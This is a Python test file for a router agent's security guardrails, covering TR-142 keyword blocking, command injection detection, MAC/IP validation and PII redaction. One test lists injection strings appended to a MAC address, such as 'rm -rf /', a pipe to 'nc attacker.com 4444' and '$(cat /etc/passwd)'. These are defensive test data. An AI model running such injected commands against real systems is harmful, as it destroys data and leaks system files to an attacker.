"""Tests for Security Guardrails, TR-142 Compliance, and Command Injection Prevention."""
import pytest
from core.schema import (
    ActionType,
    DeterministicRouterCommand,
    DeviceIsolationAction,
    TrafficPriorityAction,
)
from core.security import (
    CommandInjectionGuard,
    NetworkValidator,
    PrivacySanitizer,
    SecurityViolationError,
    TR142Validator,
    TR142ViolationError,
    verify_action_security,
)


def test_tr142_compliance_blocks_onu_keywords():
    forbidden_inputs = [
        "set onu power level to maximum",
        "update omci configuration",
        "disable pon_laser",
        "change gemport mapping",
        "inspect optical_power level",
        "tcont allocation"
    ]
    for inp in forbidden_inputs:
        with pytest.raises(TR142ViolationError):
            TR142Validator.verify(inp)


def test_tr142_compliance_allows_l3_rg_keywords():
    allowed_inputs = [
        "set qos priority on wlan0",
        "isolate ip 192.168.1.50 in nftables",
        "prioritize laptop mac AA:BB:CC:DD:EE:FF",
        "configure cake bandwidth to 100mbps"
    ]
    for inp in allowed_inputs:
        assert TR142Validator.verify(inp) is True


def test_command_injection_guard_detects_dangerous_characters():
    injections = [
        "AA:BB:CC:DD:EE:FF; rm -rf /",
        "AA:BB:CC:DD:EE:FF | nc attacker.com 4444",
        "AA:BB:CC:DD:EE:FF `reboot`",
        "AA:BB:CC:DD:EE:FF $(cat /etc/passwd)",
        "test_zone > /dev/null",
        "& echo pwned"
    ]
    for inj in injections:
        with pytest.raises(SecurityViolationError):
            CommandInjectionGuard.sanitize_and_check(inj)


def test_network_validator():
    assert NetworkValidator.is_valid_mac("AA:BB:CC:DD:EE:FF") is True
    assert NetworkValidator.is_valid_mac("aa-bb-cc-dd-ee-ff") is False  # Must use colon in strict validator
    assert NetworkValidator.is_valid_mac("invalid-mac") is False

    assert NetworkValidator.is_valid_ip_or_cidr("192.168.1.1") is True
    assert NetworkValidator.is_valid_ip_or_cidr("10.0.0.0/24") is True
    assert NetworkValidator.is_valid_ip_or_cidr("2001:db8::1") is True
    assert NetworkValidator.is_valid_ip_or_cidr("999.999.999.999") is False


def test_privacy_sanitizer():
    raw_text = "User visited https://sensitive-bank.com/user?token=12345 from device"
    sanitized = PrivacySanitizer.redact_pii(raw_text)
    assert "https://sensitive-bank.com/user?token=12345" not in sanitized
    assert "[REDACTED_URL]" in sanitized


def test_verify_action_security_valid():
    cmd = DeterministicRouterCommand(
        target_action=ActionType.SET_TRAFFIC_PRIORITY,
        payload=TrafficPriorityAction(
            target_mac="A4:C3:F0:12:89:AB",
            priority_class="WORK_EF",
            duration_minutes=60,
            narrative_response="Prioritas kerja diaktifkan."
        ),
        summary="Set traffic priority",
        requires_edge_dispatch=True
    )
    assert verify_action_security(cmd) is True


def test_verify_action_security_violating_tr142():
    cmd = DeterministicRouterCommand(
        target_action=ActionType.ISOLATE_IOT_DEVICE,
        payload=DeviceIsolationAction(
            action=ActionType.ISOLATE_IOT_DEVICE,
            target_mac="CC:2D:E0:99:88:77",
            quarantine_zone="quarantine_onu_omci_vlan",
            reason="ONU modification attempt",
            narrative_response="Isolasi perangkat."
        ),
        summary="Isolate ONU",
        requires_edge_dispatch=True
    )
    with pytest.raises(TR142ViolationError):
        verify_action_security(cmd)
